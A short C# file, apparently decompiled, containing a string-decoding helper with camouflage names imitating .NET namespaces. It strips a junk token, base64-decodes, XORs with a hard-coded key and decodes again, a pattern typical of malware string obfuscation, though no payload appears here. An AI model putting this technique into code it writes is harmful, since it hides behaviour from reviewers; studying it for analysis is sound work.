using System;
using System.Text;

public static class SystemSecurityCryptographyXCertificatesXSubjectKeyIdentifierHashAlgorithmL
{
	public static string SystemCollectionsSpecializedINotifyCollectionChangedt(string SystemDiagnosticsOverflowActiono)
	{
		string s = SystemDiagnosticsOverflowActiono.Replace("NetIWebProxyg", string.Empty);
		SystemDiagnosticsOverflowActiono = $"{string.Empty}{Encoding.UTF8.GetString(Convert.FromBase64String(s))}";
		StringBuilder stringBuilder = SystemComponentModelEditorAttributex(delegate(StringBuilder sb)
		{
			for (int i = 0; i < SystemDiagnosticsOverflowActiono.Length; i++)
			{
				sb.Append(SystemSecurityCryptographyCAPIBasePROVENUMALGSEXh(SystemDiagnosticsOverflowActiono, i));
			}
		});
		byte[] bytes = Convert.FromBase64String(stringBuilder.ToString());
		return Encoding.UTF8.GetString(bytes);
	}

	public static char SystemSecurityCryptographyCAPIBasePROVENUMALGSEXh(string data, int c)
	{
		return (char)(data[c] ^ "rbsqDoztNXqxTK"[c % "rbsqDoztNXqxTK".Length]);
	}

	public static StringBuilder SystemComponentModelEditorAttributex(Action<StringBuilder> action)
	{
		StringBuilder stringBuilder = new StringBuilder();
		action(stringBuilder);
		return stringBuilder;
	}
}
